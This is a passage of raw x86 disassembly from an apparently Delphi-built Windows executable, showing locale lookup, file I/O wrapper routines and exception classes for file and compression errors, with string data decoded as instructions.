  406f4b:	6e                   	outsb  %ds:(%esi),(%dx)
  406f4c:	74 72                	je     0x406fc0
  406f4e:	6f                   	outsl  %ds:(%esi),(%dx)
  406f4f:	6c                   	insb   (%dx),%es:(%edi)
  406f50:	20 50 61             	and    %dl,0x61(%eax)
  406f53:	6e                   	outsb  %ds:(%esi),(%dx)
  406f54:	65 6c                	gs insb (%dx),%es:(%edi)
  406f56:	5c                   	pop    %esp
  406f57:	49                   	dec    %ecx
  406f58:	6e                   	outsb  %ds:(%esi),(%dx)
  406f59:	74 65                	je     0x406fc0
  406f5b:	72 6e                	jb     0x406fcb
  406f5d:	61                   	popa
  406f5e:	74 69                	je     0x406fc9
  406f60:	6f                   	outsl  %ds:(%esi),(%dx)
  406f61:	6e                   	outsb  %ds:(%esi),(%dx)
  406f62:	61                   	popa
  406f63:	6c                   	insb   (%dx),%es:(%edi)
  406f64:	00 00                	add    %al,(%eax)
  406f66:	00 00                	add    %al,(%eax)
  406f68:	4c                   	dec    %esp
  406f69:	6f                   	outsl  %ds:(%esi),(%dx)
  406f6a:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  406f6d:	65 00 00             	add    %al,%gs:(%eax)
  406f70:	43                   	inc    %ebx
  406f71:	6f                   	outsl  %ds:(%esi),(%dx)
  406f72:	6e                   	outsb  %ds:(%esi),(%dx)
  406f73:	74 72                	je     0x406fe7
  406f75:	6f                   	outsl  %ds:(%esi),(%dx)
  406f76:	6c                   	insb   (%dx),%es:(%edi)
  406f77:	20 50 61             	and    %dl,0x61(%eax)
  406f7a:	6e                   	outsb  %ds:(%esi),(%dx)
  406f7b:	65 6c                	gs insb (%dx),%es:(%edi)
  406f7d:	5c                   	pop    %esp
  406f7e:	44                   	inc    %esp
  406f7f:	65 73 6b             	gs jae 0x406fed
  406f82:	74 6f                	je     0x406ff3
  406f84:	70 5c                	jo     0x406fe2
  406f86:	52                   	push   %edx
  406f87:	65 73 6f             	gs jae 0x406ff9
  406f8a:	75 72                	jne    0x406ffe
  406f8c:	63 65 4c             	arpl   %esp,0x4c(%ebp)
  406f8f:	6f                   	outsl  %ds:(%esi),(%dx)
  406f90:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  406f93:	65 00 00             	add    %al,%gs:(%eax)
  406f96:	00 00                	add    %al,(%eax)
  406f98:	00 00                	add    %al,(%eax)
  406f9a:	00 00                	add    %al,(%eax)
  406f9c:	ff                   	(bad)
  406f9d:	ff                   	(bad)
  406f9e:	ff                   	(bad)
  406f9f:	ff 01                	incl   (%ecx)
  406fa1:	00 00                	add    %al,(%eax)
  406fa3:	00 24 00             	add    %ah,(%eax,%eax,1)
  406fa6:	00 00                	add    %al,(%eax)
  406fa8:	53                   	push   %ebx
  406fa9:	56                   	push   %esi
  406faa:	8b da                	mov    %edx,%ebx
  406fac:	8b f0                	mov    %eax,%esi
  406fae:	8b c3                	mov    %ebx,%eax
  406fb0:	8b d6                	mov    %esi,%edx
  406fb2:	e8 75 c2 ff ff       	call   0x40322c
  406fb7:	83 3b 00             	cmpl   $0x0,(%ebx)
  406fba:	74 18                	je     0x406fd4
  406fbc:	8b 03                	mov    (%ebx),%eax
  406fbe:	e8 79 f7 ff ff       	call   0x40673c
  406fc3:	80 38 2e             	cmpb   $0x2e,(%eax)
  406fc6:	76 0c                	jbe    0x406fd4
  406fc8:	8b c3                	mov    %ebx,%eax
  406fca:	ba e0 6f 40 00       	mov    $0x406fe0,%edx
  406fcf:	e8 28 c3 ff ff       	call   0x4032fc
  406fd4:	5e                   	pop    %esi
  406fd5:	5b                   	pop    %ebx
  406fd6:	c3                   	ret
  406fd7:	00 ff                	add    %bh,%bh
  406fd9:	ff                   	(bad)
  406fda:	ff                   	(bad)
  406fdb:	ff 01                	incl   (%ecx)
  406fdd:	00 00                	add    %al,(%eax)
  406fdf:	00 2e                	add    %ch,(%esi)
  406fe1:	00 00                	add    %al,(%eax)
  406fe3:	00 53 56             	add    %dl,0x56(%ebx)
  406fe6:	81 c4 00 ff ff ff    	add    $0xffffff00,%esp
  406fec:	8b f0                	mov    %eax,%esi
  406fee:	e8 09 e6 ff ff       	call   0x4055fc
  406ff3:	8b d8                	mov    %eax,%ebx
  406ff5:	85 db                	test   %ebx,%ebx
  406ff7:	75 0e                	jne    0x407007
  406ff9:	8b c6                	mov    %esi,%eax
  406ffb:	ba 48 70 40 00       	mov    $0x407048,%edx
  407000:	e8 27 c2 ff ff       	call   0x40322c
  407005:	eb 2e                	jmp    0x407035
  407007:	8b c3                	mov    %ebx,%eax
  407009:	ba b0 45 40 00       	mov    $0x4045b0,%edx
  40700e:	e8 59 b9 ff ff       	call   0x40296c
  407013:	84 c0                	test   %al,%al
  407015:	74 0c                	je     0x407023
  407017:	8b d6                	mov    %esi,%edx
  407019:	8b 43 04             	mov    0x4(%ebx),%eax
  40701c:	e8 87 ff ff ff       	call   0x406fa8
  407021:	eb 12                	jmp    0x407035
  407023:	8b d4                	mov    %esp,%edx
  407025:	8b 03                	mov    (%ebx),%eax
  407027:	e8 40 b8 ff ff       	call   0x40286c
  40702c:	8b d4                	mov    %esp,%edx
  40702e:	8b c6                	mov    %esi,%eax
  407030:	e8 83 c2 ff ff       	call   0x4032b8
  407035:	81 c4 00 01 00 00    	add    $0x100,%esp
  40703b:	5e                   	pop    %esi
  40703c:	5b                   	pop    %ebx
  40703d:	c3                   	ret
  40703e:	00 00                	add    %al,(%eax)
  407040:	ff                   	(bad)
  407041:	ff                   	(bad)
  407042:	ff                   	(bad)
  407043:	ff 12                	call   *(%edx)
  407045:	00 00                	add    %al,(%eax)
  407047:	00 5b 45             	add    %bl,0x45(%ebx)
  40704a:	78 63                	js     0x4070af
  40704c:	65 70 74             	gs jo  0x4070c3
  40704f:	4f                   	dec    %edi
  407050:	62 6a 65             	bound  %ebp,0x65(%edx)
  407053:	63 74 3d 6e          	arpl   %esi,0x6e(%ebp,%edi,1)
  407057:	69 6c 5d 00 00 53 81 	imul   $0xc4815300,0x0(%ebp,%ebx,2),%ebp
  40705e:	c4 
  40705f:	00 fc                	add    %bh,%ah
  407061:	ff                   	(bad)
  407062:	ff 8b da 6a 00 68    	decl   0x68006ada(%ebx)
  407068:	00 04 00             	add    %al,(%eax,%eax,1)
  40706b:	00 8d 54 24 08 52    	add    %cl,0x52082454(%ebp)
  407071:	6a 00                	push   $0x0
  407073:	50                   	push   %eax
  407074:	6a 00                	push   $0x0
  407076:	68 00 32 00 00       	push   $0x3200
  40707b:	e8 74 d3 ff ff       	call   0x4043f4
  407080:	eb 01                	jmp    0x407083
  407082:	48                   	dec    %eax
  407083:	85 c0                	test   %eax,%eax
  407085:	7e 0e                	jle    0x407095
  407087:	8a 54 04 ff          	mov    -0x1(%esp,%eax,1),%dl
  40708b:	80 ea 21             	sub    $0x21,%dl
  40708e:	72 f2                	jb     0x407082
  407090:	80 ea 0d             	sub    $0xd,%dl
  407093:	74 ed                	je     0x407082
  407095:	8b d4                	mov    %esp,%edx
  407097:	8b cb                	mov    %ebx,%ecx
  407099:	91                   	xchg   %eax,%ecx
  40709a:	e8 d9 c1 ff ff       	call   0x403278
  40709f:	81 c4 00 04 00 00    	add    $0x400,%esp
  4070a5:	5b                   	pop    %ebx
  4070a6:	c3                   	ret
  4070a7:	90                   	nop
	...
  4070c0:	f0 70 40             	lock jo 0x407103
  4070c3:	00 04 00             	add    %al,(%eax,%eax,1)
  4070c6:	00 00                	add    %al,(%eax)
  4070c8:	3c 10                	cmp    $0x10,%al
  4070ca:	40                   	inc    %eax
  4070cb:	00 c4                	add    %al,%ah
  4070cd:	29 40 00             	sub    %eax,0x0(%eax)
  4070d0:	ac                   	lods   %ds:(%esi),%al
  4070d1:	28 40 00             	sub    %al,0x0(%eax)
  4070d4:	d4 28                	aam    $0x28
  4070d6:	40                   	inc    %eax
  4070d7:	00 18                	add    %bl,(%eax)
  4070d9:	29 40 00             	sub    %eax,0x0(%eax)
  4070dc:	fc                   	cld
  4070dd:	70 40                	jo     0x40711f
  4070df:	00 04 71             	add    %al,(%ecx,%esi,2)
  4070e2:	40                   	inc    %eax
  4070e3:	00 0c 71             	add    %cl,(%ecx,%esi,2)
  4070e6:	40                   	inc    %eax
  4070e7:	00 14 71             	add    %dl,(%ecx,%esi,2)
  4070ea:	40                   	inc    %eax
  4070eb:	00 1c 71             	add    %bl,(%ecx,%esi,2)
  4070ee:	40                   	inc    %eax
  4070ef:	00 0b                	add    %cl,(%ebx)
  4070f1:	54                   	push   %esp
  4070f2:	43                   	inc    %ebx
  4070f3:	75 73                	jne    0x407168
  4070f5:	74 6f                	je     0x407166
  4070f7:	6d                   	insl   (%dx),%es:(%edi)
  4070f8:	46                   	inc    %esi
  4070f9:	69 6c 65 e9 ff b5 ff 	imul   $0xffffb5ff,-0x17(%ebp,%eiz,2),%ebp
  407100:	ff 
  407101:	8d 40 00             	lea    0x0(%eax),%eax
  407104:	e9 f7 b5 ff ff       	jmp    0x402700
  407109:	8d 40 00             	lea    0x0(%eax),%eax
  40710c:	e9 ef b5 ff ff       	jmp    0x402700
  407111:	8d 40 00             	lea    0x0(%eax),%eax
  407114:	e9 e7 b5 ff ff       	jmp    0x402700
  407119:	8d 40 00             	lea    0x0(%eax),%eax
  40711c:	e9 df b5 ff ff       	jmp    0x402700
  407121:	8d 40 00             	lea    0x0(%eax),%eax
	...
  40713c:	70 71                	jo     0x4071af
  40713e:	40                   	inc    %eax
  40713f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407142:	00 00                	add    %al,(%eax)
  407144:	dc 70 40             	fdivl  0x40(%eax)
  407147:	00 c4                	add    %al,%ah
  407149:	29 40 00             	sub    %eax,0x0(%eax)
  40714c:	ac                   	lods   %ds:(%esi),%al
  40714d:	28 40 00             	sub    %al,0x0(%eax)
  407150:	d4 28                	aam    $0x28
  407152:	40                   	inc    %eax
  407153:	00 14 73             	add    %dl,(%ebx,%esi,2)
  407156:	40                   	inc    %eax
  407157:	00 90 73 40 00 c8    	add    %dl,-0x37ffbf8d(%eax)
  40715d:	73 40                	jae    0x40719f
  40715f:	00 f8                	add    %bh,%al
  407161:	73 40                	jae    0x4071a3
  407163:	00 38                	add    %bh,(%eax)
  407165:	74 40                	je     0x4071a7
  407167:	00 94 74 40 00 44 73 	add    %dl,0x73440040(%esp,%esi,2)
  40716e:	40                   	inc    %eax
  40716f:	00 05 54 46 69 6c    	add    %al,0x6c694654
  407175:	65 8b c0             	gs mov %eax,%eax
	...
  407190:	ac                   	lods   %ds:(%esi),%al
  407191:	71 40                	jno    0x4071d3
  407193:	00 10                	add    %dl,(%eax)
  407195:	00 00                	add    %al,(%eax)
  407197:	00 b0 45 40 00 c4    	add    %dh,-0x3bffbfbb(%eax)
  40719d:	29 40 00             	sub    %eax,0x0(%eax)
  4071a0:	ac                   	lods   %ds:(%esi),%al
  4071a1:	28 40 00             	sub    %al,0x0(%eax)
  4071a4:	d4 28                	aam    $0x28
  4071a6:	40                   	inc    %eax
  4071a7:	00 18                	add    %bl,(%eax)
  4071a9:	29 40 00             	sub    %eax,0x0(%eax)
  4071ac:	0a 45 46             	or     0x46(%ebp),%al
  4071af:	69 6c 65 45 72 72 6f 	imul   $0x726f7272,0x45(%ebp,%eiz,2),%ebp
  4071b6:	72 
  4071b7:	90                   	nop
  4071b8:	55                   	push   %ebp
  4071b9:	8b ec                	mov    %esp,%ebp
  4071bb:	83 c4 f4             	add    $0xfffffff4,%esp
  4071be:	53                   	push   %ebx
  4071bf:	56                   	push   %esi
  4071c0:	57                   	push   %edi
  4071c1:	33 c9                	xor    %ecx,%ecx
  4071c3:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4071c6:	8b da                	mov    %edx,%ebx
  4071c8:	33 c0                	xor    %eax,%eax
  4071ca:	55                   	push   %ebp
  4071cb:	68 2d 72 40 00       	push   $0x40722d
  4071d0:	64 ff 30             	push   %fs:(%eax)
  4071d3:	64 89 20             	mov    %esp,%fs:(%eax)
  4071d6:	8d 55 fc             	lea    -0x4(%ebp),%edx
  4071d9:	8b c3                	mov    %ebx,%eax
  4071db:	e8 7c fe ff ff       	call   0x40705c
  4071e0:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4071e4:	75 1a                	jne    0x407200
  4071e6:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4071e9:	50                   	push   %eax
  4071ea:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  4071ed:	c6 45 f8 00          	movb   $0x0,-0x8(%ebp)
  4071f1:	8d 55 f4             	lea    -0xc(%ebp),%edx
  4071f4:	33 c9                	xor    %ecx,%ecx
  4071f6:	b8 44 72 40 00       	mov    $0x407244,%eax
  4071fb:	e8 e4 de ff ff       	call   0x4050e4
  407200:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407203:	b2 01                	mov    $0x1,%dl
  407205:	b8 ac 71 40 00       	mov    $0x4071ac,%eax
  40720a:	e8 d1 e5 ff ff       	call   0x4057e0
  40720f:	89 58 0c             	mov    %ebx,0xc(%eax)
  407212:	e8 9d bc ff ff       	call   0x402eb4
  407217:	33 c0                	xor    %eax,%eax
  407219:	5a                   	pop    %edx
  40721a:	59                   	pop    %ecx
  40721b:	59                   	pop    %ecx
  40721c:	64 89 10             	mov    %edx,%fs:(%eax)
  40721f:	68 34 72 40 00       	push   $0x407234
  407224:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407227:	e8 6c bf ff ff       	call   0x403198
  40722c:	c3                   	ret
  40722d:	e9 ca bb ff ff       	jmp    0x402dfc
  407232:	eb f0                	jmp    0x407224
  407234:	5f                   	pop    %edi
  407235:	5e                   	pop    %esi
  407236:	5b                   	pop    %ebx
  407237:	8b e5                	mov    %ebp,%esp
  407239:	5d                   	pop    %ebp
  40723a:	c3                   	ret
  40723b:	00 ff                	add    %bh,%bh
  40723d:	ff                   	(bad)
  40723e:	ff                   	(bad)
  40723f:	ff 11                	call   *(%ecx)
  407241:	00 00                	add    %al,(%eax)
  407243:	00 46 69             	add    %al,0x69(%esi)
  407246:	6c                   	insb   (%dx),%es:(%edi)
  407247:	65 20 49 2f          	and    %cl,%gs:0x2f(%ecx)
  40724b:	4f                   	dec    %edi
  40724c:	20 65 72             	and    %ah,0x72(%ebp)
  40724f:	72 6f                	jb     0x4072c0
  407251:	72 20                	jb     0x407273
  407253:	25 64 00 00 00       	and    $0x64,%eax
  407258:	53                   	push   %ebx
  407259:	8b d8                	mov    %eax,%ebx
  40725b:	e8 e4 d1 ff ff       	call   0x404444
  407260:	8b d0                	mov    %eax,%edx
  407262:	8b c3                	mov    %ebx,%eax
  407264:	e8 4f ff ff ff       	call   0x4071b8
  407269:	5b                   	pop    %ebx
  40726a:	c3                   	ret
  40726b:	90                   	nop
  40726c:	53                   	push   %ebx
  40726d:	56                   	push   %esi
  40726e:	57                   	push   %edi
  40726f:	8b f1                	mov    %ecx,%esi
  407271:	8b fa                	mov    %edx,%edi
  407273:	8b d8                	mov    %eax,%ebx
  407275:	8b d7                	mov    %edi,%edx
  407277:	8b ce                	mov    %esi,%ecx
  407279:	8b c3                	mov    %ebx,%eax
  40727b:	8b 38                	mov    (%eax),%edi
  40727d:	ff 57 08             	call   *0x8(%edi)
  407280:	3b f0                	cmp    %eax,%esi
  407282:	74 0c                	je     0x407290
  407284:	ba 26 00 00 00       	mov    $0x26,%edx
  407289:	8b 03                	mov    (%ebx),%eax
  40728b:	e8 28 ff ff ff       	call   0x4071b8
  407290:	5f                   	pop    %edi
  407291:	5e                   	pop    %esi
  407292:	5b                   	pop    %ebx
  407293:	c3                   	ret
  407294:	83 c4 f8             	add    $0xfffffff8,%esp
  407297:	33 c9                	xor    %ecx,%ecx
  407299:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  40729d:	89 14 24             	mov    %edx,(%esp)
  4072a0:	8b d4                	mov    %esp,%edx
  4072a2:	8b 08                	mov    (%eax),%ecx
  4072a4:	ff 51 0c             	call   *0xc(%ecx)
  4072a7:	59                   	pop    %ecx
  4072a8:	5a                   	pop    %edx
  4072a9:	c3                   	ret
  4072aa:	8b c0                	mov    %eax,%eax
  4072ac:	55                   	push   %ebp
  4072ad:	8b ec                	mov    %esp,%ebp
  4072af:	51                   	push   %ecx
  4072b0:	53                   	push   %ebx
  4072b1:	56                   	push   %esi
  4072b2:	84 d2                	test   %dl,%dl
  4072b4:	74 08                	je     0x4072be
  4072b6:	83 c4 f0             	add    $0xfffffff0,%esp
  4072b9:	e8 0a b8 ff ff       	call   0x402ac8
  4072be:	8b f1                	mov    %ecx,%esi
  4072c0:	88 55 ff             	mov    %dl,-0x1(%ebp)
  4072c3:	8b d8                	mov    %eax,%ebx
  4072c5:	33 d2                	xor    %edx,%edx
  4072c7:	8b c3                	mov    %ebx,%eax
  4072c9:	e8 2e b6 ff ff       	call   0x4028fc
  4072ce:	8a 45 0c             	mov    0xc(%ebp),%al
  4072d1:	50                   	push   %eax
  4072d2:	8a 45 08             	mov    0x8(%ebp),%al
  4072d5:	50                   	push   %eax
  4072d6:	8a 4d 10             	mov    0x10(%ebp),%cl
  4072d9:	8b d6                	mov    %esi,%edx
  4072db:	8b c3                	mov    %ebx,%eax
  4072dd:	8b 30                	mov    (%eax),%esi
  4072df:	ff 56 14             	call   *0x14(%esi)
  4072e2:	89 43 04             	mov    %eax,0x4(%ebx)
  4072e5:	8b 43 04             	mov    0x4(%ebx),%eax
  4072e8:	85 c0                	test   %eax,%eax
  4072ea:	74 03                	je     0x4072ef
  4072ec:	40                   	inc    %eax
  4072ed:	75 07                	jne    0x4072f6
  4072ef:	8b 03                	mov    (%ebx),%eax
  4072f1:	e8 62 ff ff ff       	call   0x407258
  4072f6:	c6 43 08 01          	movb   $0x1,0x8(%ebx)
  4072fa:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  4072fe:	74 0a                	je     0x40730a
  407300:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  407307:	83 c4 0c             	add    $0xc,%esp
  40730a:	8b c3                	mov    %ebx,%eax
  40730c:	5e                   	pop    %esi
  40730d:	5b                   	pop    %ebx
  40730e:	59                   	pop    %ecx
  40730f:	5d                   	pop    %ebp
  407310:	c2 0c 00             	ret    $0xc
  407313:	90                   	nop
  407314:	53                   	push   %ebx
  407315:	56                   	push   %esi
  407316:	8b da                	mov    %edx,%ebx
  407318:	8b f0                	mov    %eax,%esi
  40731a:	80 7e 08 00          	cmpb   $0x0,0x8(%esi)
  40731e:	74 09                	je     0x407329
  407320:	8b 46 04             	mov    0x4(%esi),%eax
  407323:	50                   	push   %eax
  407324:	e8 9b d0 ff ff       	call   0x4043c4
  407329:	33 d2                	xor    %edx,%edx
  40732b:	8b c6                	mov    %esi,%eax
  40732d:	e8 e6 b5 ff ff       	call   0x402918
  407332:	84 db                	test   %bl,%bl
  407334:	74 07                	je     0x40733d
  407336:	8b c6                	mov    %esi,%eax
  407338:	e8 c7 b7 ff ff       	call   0x402b04
  40733d:	8b c6                	mov    %esi,%eax
  40733f:	5e                   	pop    %esi
  407340:	5b                   	pop    %ebx
  407341:	c3                   	ret
  407342:	8b c0                	mov    %eax,%eax
  407344:	55                   	push   %ebp
  407345:	8b ec                	mov    %esp,%ebp
  407347:	53                   	push   %ebx
  407348:	56                   	push   %esi
  407349:	8b d9                	mov    %ecx,%ebx
  40734b:	8b f2                	mov    %edx,%esi
  40734d:	6a 00                	push   $0x0
  40734f:	68 80 00 00 00       	push   $0x80
  407354:	33 c0                	xor    %eax,%eax
  407356:	8a c3                	mov    %bl,%al
  407358:	8b 04 85 74 a1 40 00 	mov    0x40a174(,%eax,4),%eax
  40735f:	50                   	push   %eax
  407360:	6a 00                	push   $0x0
  407362:	33 c0                	xor    %eax,%eax
  407364:	8a 45 08             	mov    0x8(%ebp),%al
  407367:	8b 04 85 64 a1 40 00 	mov    0x40a164(,%eax,4),%eax
  40736e:	50                   	push   %eax
  40736f:	33 c0                	xor    %eax,%eax
  407371:	8a 45 0c             	mov    0xc(%ebp),%al
  407374:	8b 04 85 58 a1 40 00 	mov    0x40a158(,%eax,4),%eax
  40737b:	50                   	push   %eax
  40737c:	8b c6                	mov    %esi,%eax
  40737e:	e8 91 c0 ff ff       	call   0x403414
  407383:	50                   	push   %eax
  407384:	e8 4b d0 ff ff       	call   0x4043d4
  407389:	5e                   	pop    %esi
  40738a:	5b                   	pop    %ebx
  40738b:	5d                   	pop    %ebp
  40738c:	c2 08 00             	ret    $0x8
  40738f:	90                   	nop
  407390:	53                   	push   %ebx
  407391:	56                   	push   %esi
  407392:	8b da                	mov    %edx,%ebx
  407394:	8b f0                	mov    %eax,%esi
  407396:	33 c0                	xor    %eax,%eax
  407398:	89 43 04             	mov    %eax,0x4(%ebx)
  40739b:	6a 01                	push   $0x1
  40739d:	8d 43 04             	lea    0x4(%ebx),%eax
  4073a0:	50                   	push   %eax
  4073a1:	6a 00                	push   $0x0
  4073a3:	8b 46 04             	mov    0x4(%esi),%eax
  4073a6:	50                   	push   %eax
  4073a7:	e8 28 d1 ff ff       	call   0x4044d4
  4073ac:	89 03                	mov    %eax,(%ebx)
  4073ae:	83 3b ff             	cmpl   $0xffffffff,(%ebx)
  4073b1:	75 10                	jne    0x4073c3
  4073b3:	e8 8c d0 ff ff       	call   0x404444
  4073b8:	85 c0                	test   %eax,%eax
  4073ba:	74 07                	je     0x4073c3
  4073bc:	8b 06                	mov    (%esi),%eax
  4073be:	e8 95 fe ff ff       	call   0x407258
  4073c3:	5e                   	pop    %esi
  4073c4:	5b                   	pop    %ebx
  4073c5:	c3                   	ret
  4073c6:	8b c0                	mov    %eax,%eax
  4073c8:	53                   	push   %ebx
  4073c9:	56                   	push   %esi
  4073ca:	8b da                	mov    %edx,%ebx
  4073cc:	8b f0                	mov    %eax,%esi
  4073ce:	8d 43 04             	lea    0x4(%ebx),%eax
  4073d1:	50                   	push   %eax
  4073d2:	8b 46 04             	mov    0x4(%esi),%eax
  4073d5:	50                   	push   %eax
  4073d6:	e8 59 d0 ff ff       	call   0x404434
  4073db:	89 03                	mov    %eax,(%ebx)
  4073dd:	83 3b ff             	cmpl   $0xffffffff,(%ebx)
  4073e0:	75 10                	jne    0x4073f2
  4073e2:	e8 5d d0 ff ff       	call   0x404444
  4073e7:	85 c0                	test   %eax,%eax
  4073e9:	74 07                	je     0x4073f2
  4073eb:	8b 06                	mov    (%esi),%eax
  4073ed:	e8 66 fe ff ff       	call   0x407258
  4073f2:	5e                   	pop    %esi
  4073f3:	5b                   	pop    %ebx
  4073f4:	c3                   	ret
  4073f5:	8d 40 00             	lea    0x0(%eax),%eax
  4073f8:	53                   	push   %ebx
  4073f9:	56                   	push   %esi
  4073fa:	57                   	push   %edi
  4073fb:	51                   	push   %ecx
  4073fc:	8b f9                	mov    %ecx,%edi
  4073fe:	8b f2                	mov    %edx,%esi
  407400:	8b d8                	mov    %eax,%ebx
  407402:	6a 00                	push   $0x0
  407404:	8d 44 24 04          	lea    0x4(%esp),%eax
  407408:	50                   	push   %eax
  407409:	57                   	push   %edi
  40740a:	56                   	push   %esi
  40740b:	8b 43 04             	mov    0x4(%ebx),%eax
  40740e:	50                   	push   %eax
  40740f:	e8 a0 d0 ff ff       	call   0x4044b4
  407414:	85 c0                	test   %eax,%eax
  407416:	75 17                	jne    0x40742f
  407418:	80 7b 08 00          	cmpb   $0x0,0x8(%ebx)
  40741c:	75 0a                	jne    0x407428
  40741e:	e8 21 d0 ff ff       	call   0x404444
  407423:	83 f8 6d             	cmp    $0x6d,%eax
  407426:	74 07                	je     0x40742f
  407428:	8b 03                	mov    (%ebx),%eax
  40742a:	e8 29 fe ff ff       	call   0x407258
  40742f:	8b 04 24             	mov    (%esp),%eax
  407432:	5a                   	pop    %edx
  407433:	5f                   	pop    %edi
  407434:	5e                   	pop    %esi
  407435:	5b                   	pop    %ebx
  407436:	c3                   	ret
  407437:	90                   	nop
  407438:	53                   	push   %ebx
  407439:	56                   	push   %esi
  40743a:	57                   	push   %edi
  40743b:	83 c4 f8             	add    $0xfffffff8,%esp
  40743e:	8b f2                	mov    %edx,%esi
  407440:	8d 3c 24             	lea    (%esp),%edi
  407443:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407444:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407445:	8b d8                	mov    %eax,%ebx
  407447:	6a 00                	push   $0x0
  407449:	8d 44 24 08          	lea    0x8(%esp),%eax
  40744d:	50                   	push   %eax
  40744e:	8b 44 24 08          	mov    0x8(%esp),%eax
  407452:	50                   	push   %eax
  407453:	8b 43 04             	mov    0x4(%ebx),%eax
  407456:	50                   	push   %eax
  407457:	e8 78 d0 ff ff       	call   0x4044d4
  40745c:	40                   	inc    %eax
  40745d:	75 10                	jne    0x40746f
  40745f:	e8 e0 cf ff ff       	call   0x404444
  407464:	85 c0                	test   %eax,%eax
  407466:	74 07                	je     0x40746f
  407468:	8b 03                	mov    (%ebx),%eax
  40746a:	e8 e9 fd ff ff       	call   0x407258
  40746f:	59                   	pop    %ecx
  407470:	5a                   	pop    %edx
  407471:	5f                   	pop    %edi
  407472:	5e                   	pop    %esi
  407473:	5b                   	pop    %ebx
  407474:	c3                   	ret
  407475:	8d 40 00             	lea    0x0(%eax),%eax
  407478:	53                   	push   %ebx
  407479:	8b d8                	mov    %eax,%ebx
  40747b:	8b 43 04             	mov    0x4(%ebx),%eax
  40747e:	50                   	push   %eax
  40747f:	e8 40 d0 ff ff       	call   0x4044c4
  407484:	85 c0                	test   %eax,%eax
  407486:	75 07                	jne    0x40748f
  407488:	8b 03                	mov    (%ebx),%eax
  40748a:	e8 c9 fd ff ff       	call   0x407258
  40748f:	5b                   	pop    %ebx
  407490:	c3                   	ret
  407491:	8d 40 00             	lea    0x0(%eax),%eax
  407494:	53                   	push   %ebx
  407495:	56                   	push   %esi
  407496:	57                   	push   %edi
  407497:	51                   	push   %ecx
  407498:	8b f1                	mov    %ecx,%esi
  40749a:	8b fa                	mov    %edx,%edi
  40749c:	8b d8                	mov    %eax,%ebx
  40749e:	6a 00                	push   $0x0
  4074a0:	8d 44 24 04          	lea    0x4(%esp),%eax
  4074a4:	50                   	push   %eax
  4074a5:	56                   	push   %esi
  4074a6:	57                   	push   %edi
  4074a7:	8b 43 04             	mov    0x4(%ebx),%eax
  4074aa:	50                   	push   %eax
  4074ab:	e8 64 d0 ff ff       	call   0x404514
  4074b0:	85 c0                	test   %eax,%eax
  4074b2:	75 07                	jne    0x4074bb
  4074b4:	8b 03                	mov    (%ebx),%eax
  4074b6:	e8 9d fd ff ff       	call   0x407258
  4074bb:	3b 34 24             	cmp    (%esp),%esi
  4074be:	74 0c                	je     0x4074cc
  4074c0:	ba 1d 00 00 00       	mov    $0x1d,%edx
  4074c5:	8b 03                	mov    (%ebx),%eax
  4074c7:	e8 ec fc ff ff       	call   0x4071b8
  4074cc:	5a                   	pop    %edx
  4074cd:	5f                   	pop    %edi
  4074ce:	5e                   	pop    %esi
  4074cf:	5b                   	pop    %ebx
  4074d0:	c3                   	ret
  4074d1:	8d 40 00             	lea    0x0(%eax),%eax
	...
  4074ec:	08 75 40             	or     %dh,0x40(%ebp)
  4074ef:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4074f2:	00 00                	add    %al,(%eax)
  4074f4:	b0 45                	mov    $0x45,%al
  4074f6:	40                   	inc    %eax
  4074f7:	00 c4                	add    %al,%ah
  4074f9:	29 40 00             	sub    %eax,0x0(%eax)
  4074fc:	ac                   	lods   %ds:(%esi),%al
  4074fd:	28 40 00             	sub    %al,0x0(%eax)
  407500:	d4 28                	aam    $0x28
  407502:	40                   	inc    %eax
  407503:	00 18                	add    %bl,(%eax)
  407505:	29 40 00             	sub    %eax,0x0(%eax)
  407508:	0e                   	push   %cs
  407509:	45                   	inc    %ebp
  40750a:	43                   	inc    %ebx
  40750b:	6f                   	outsl  %ds:(%esi),(%dx)
  40750c:	6d                   	insl   (%dx),%es:(%edi)
  40750d:	70 72                	jo     0x407581
  40750f:	65 73 73             	gs jae 0x407585
  407512:	45                   	inc    %ebp
  407513:	72 72                	jb     0x407587
  407515:	6f                   	outsl  %ds:(%esi),(%dx)
  407516:	72 90                	jb     0x4074a8
	...
  407530:	4c                   	dec    %esp
  407531:	75 40                	jne    0x407573
  407533:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407536:	00 00                	add    %al,(%eax)
  407538:	08 75 40             	or     %dh,0x40(%ebp)
  40753b:	00 c4                	add    %al,%ah
  40753d:	29 40 00             	sub    %eax,0x0(%eax)
  407540:	ac                   	lods   %ds:(%esi),%al
  407541:	28 40 00             	sub    %al,0x0(%eax)
  407544:	d4 28                	aam    $0x28
  407546:	40                   	inc    %eax
  407547:	00 18                	add    %bl,(%eax)
  407549:	29 40 00             	sub    %eax,0x0(%eax)
  40754c:	12 45 43             	adc    0x43(%ebp),%al
  40754f:	6f                   	outsl  %ds:(%esi),(%dx)
  407550:	6d                   	insl   (%dx),%es:(%edi)
  407551:	70 72                	jo     0x4075c5
  407553:	65 73 73             	gs jae 0x4075c9
  407556:	44                   	inc    %esp
  407557:	61                   	popa
  407558:	74 61                	je     0x4075bb
  40755a:	45                   	inc    %ebp
  40755b:	72 72                	jb     0x4075cf
  40755d:	6f                   	outsl  %ds:(%esi),(%dx)
  40755e:	72 90                	jb     0x4074f0
	...
  407578:	94                   	xchg   %eax,%esp
  407579:	75 40                	jne    0x4075bb
  40757b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40757e:	00 00                	add    %al,(%eax)
  407580:	08 75 40             	or     %dh,0x40(%ebp)
  407583:	00 c4                	add    %al,%ah
  407585:	29 40 00             	sub    %eax,0x0(%eax)
  407588:	ac                   	lods   %ds:(%esi),%al
